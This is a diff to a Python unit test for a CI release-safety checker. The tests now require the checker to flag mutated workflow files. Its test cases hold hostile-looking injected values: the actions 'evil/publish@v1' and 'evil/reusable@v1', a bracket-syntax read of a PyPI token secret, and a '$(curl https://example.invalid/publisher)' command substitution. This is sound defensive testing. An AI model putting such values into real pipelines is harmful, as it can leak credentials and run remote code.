@@ -15,6 +15,9 @@ LEGACY_WORKFLOW_PATH = REPOSITORY_ROOT / ".github" / "workflows" / "ci.yml"
 LEGACY_RELEASE_SAFETY_PATH = (
     REPOSITORY_ROOT / "python" / "tools" / "check_legacy_release_safety.py"
 )
+LEGACY_RELEASE_MANIFEST_PATH = (
+    REPOSITORY_ROOT / "python" / "quality" / "legacy-ci-manifest.json"
+)
 PYPROJECT_PATH = REPOSITORY_ROOT / "python" / "pyproject.toml"
 BROWSER_TEST_PATH = (
     REPOSITORY_ROOT / "python" / "tests" / "browser" / "test_exponential_report_rtl.py"
@@ -256,6 +259,7 @@ class VeridistWorkflowContractTests(unittest.TestCase):
         checker = _load_legacy_release_safety_checker()
         legacy_workflow = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
         self.assertEqual(checker.find_violations(legacy_workflow), ())
+        self.assertTrue(LEGACY_RELEASE_MANIFEST_PATH.is_file())
 
     def test_legacy_release_safety_rejects_every_publication_capability(self) -> None:
         checker = _load_legacy_release_safety_checker()
@@ -292,17 +296,35 @@ class VeridistWorkflowContractTests(unittest.TestCase):
             with self.subTest(name=name):
                 self.assertTrue(checker.find_violations(workflow))
 
-    def test_legacy_release_safety_ignores_comments_echoes_and_harmless_environment(self) -> None:
+    def test_legacy_release_safety_ignores_comments_but_rejects_all_structural_drift(self) -> None:
         checker = _load_legacy_release_safety_checker()
-        safe_workflows = {
-            "comments": "on: push\n# twine upload dist/*\n# pypa/gh-action-pypi-publish\n",
-            "echo": _workflow_with_step("run: echo 'do not publish artifacts'"),
-            "artifact action": _workflow_with_step("uses: actions/upload-artifact@v4"),
-            "preview environment": "jobs:\n  docs:\n    environment: docs-preview\n",
+        baseline = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
+        self.assertEqual(
+            checker.find_violations(baseline + "\n# harmless prose: twine upload\n"),
+            (),
+        )
+        unsafe_workflows = {
+            "unknown job": baseline.replace(
+                "jobs:\n", "jobs:\n  unknown:\n    runs-on: ubuntu-latest\n", 1
+            ),
+            "reusable workflow": baseline.replace(
+                "  legacy-gate:\n", "  legacy-gate:\n    uses: evil/reusable@v1\n", 1
+            ),
+            "bracket secret": baseline.replace(
+                "RELEVANT: ${{ needs.legacy-scope.outputs.relevant }}",
+                "RELEVANT: ${{ secrets['PYPI_TOKEN'] }}",
+                1,
+            ),
+            "unknown action": baseline.replace("actions/checkout@v4", "evil/publish@v1", 1),
+            "command substitution": baseline.replace(
+                "python tools/check_legacy_isolation.py",
+                "$(curl https://example.invalid/publisher)",
+                1,
+            ),
         }
-        for name, workflow in safe_workflows.items():
+        for name, workflow in unsafe_workflows.items():
             with self.subTest(name=name):
-                self.assertEqual(checker.find_violations(workflow), ())
+                self.assertTrue(checker.find_violations(workflow))
 
 
 if __name__ == "__main__":
